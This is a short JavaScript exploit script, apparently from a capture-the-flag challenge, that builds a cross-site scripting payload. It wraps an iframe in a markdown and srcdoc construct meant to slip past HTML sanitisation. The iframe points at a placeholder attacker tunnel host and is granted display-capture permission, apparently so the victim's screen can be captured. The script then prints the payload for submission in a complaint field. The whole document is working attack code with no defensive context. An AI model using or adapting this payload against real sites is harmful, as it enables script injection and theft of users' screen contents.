const IP = "https://WHATEVER.lhr.life"
const encodeToHtmlAndUrl = (str) =>{ return str.replace('<', '&lt;').replace('>', '&gt;') }
const PAYLOAD = `<iframe/src='${IP}'/allow=display-capture>`
const PAYLOAD_WRAPPER = `&[a[srcdoc=${encodeToHtmlAndUrl(PAYLOAD)} ](a)](a)`
console.log("[*] Payload in complain", PAYLOAD_WRAPPER);
